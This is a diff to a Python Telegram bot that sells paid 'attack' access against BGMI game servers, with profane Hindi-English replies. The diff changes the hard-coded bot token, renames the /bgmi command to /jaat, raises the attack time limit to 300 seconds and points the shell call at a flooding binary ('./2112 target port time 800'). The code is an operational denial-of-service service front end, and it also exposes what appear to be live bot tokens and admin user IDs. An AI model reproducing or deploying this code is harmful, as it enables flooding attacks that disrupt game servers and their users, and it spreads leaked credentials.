@@ -5,7 +5,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7505830170:AAGzEGv24q7kxrcbQzHwZOzMORsKN0nl3F4')
+bot = telebot.TeleBot('7909451173:AAGCVD3Utdku_fayZWe9SNB01XoxSsBwECU')
 
 # Admin user IDs
 admin_id = {"7083378335", "1653595379"}
@@ -148,7 +148,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "Mood ni hai abhi pelhe purchase kar isse:- @uNreaIOwner."
+        response = "Mood ni hai abhi pelhe purchase kar isse:- @TREXVIVEK."
 
     bot.reply_to(message , response)
 
@@ -184,7 +184,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
  Usage: /remove <userid>'''
     else:
-        response = "Purchase karle bsdk:- @uNreaIOwner ."
+        response = "Purchase karle bsdk:- @TREXVIVEK ."
 
     bot.reply_to(message, response)
     
@@ -274,7 +274,7 @@ COOLDOWN_TIME =0
 attack_running = False
 
 # Handler for /attack command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['jaat'])
 def handle_attack(message):
     global attack_running
 
@@ -291,17 +291,17 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 240:
-                response = "Error: Time interval must be less than 240"
+            if time > 300:
+                response = "Error: Time interval must be less than 300"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/bgmi', target, port, time)
+                    record_command_logs(user_id, '/jaat', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./2111 {target} {port} {time} 900"
+                    full_command = f"./2112 {target} {port} {time} 800"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
@@ -310,7 +310,7 @@ def handle_attack(message):
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /bgmi <target> <port> <time>"
+            response = "Usage: /jaat <target> <port> <time>"
     else:
         response = "ACCESS TOH LELE FREE mai kuch nahi milega FREE mai shrif ghnta milega lega toh bata ."
 
@@ -343,7 +343,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /bgmi : 😫BGMI WALO KE SERVER KO CHODO🥵. 
+💥 /jaat : 😫BGMI WALO KE SERVER KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
@@ -370,7 +370,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''SERVER HACK pe aapka swagat hai, {user_name}! Sabse acche se bgmi ke server yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
 🤗Try To Run This Command : /help 
-💵BUY :- @uNreaIOwner'''
+💵BUY :- @TREXVIVEK'''
     bot.reply_to(message),
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
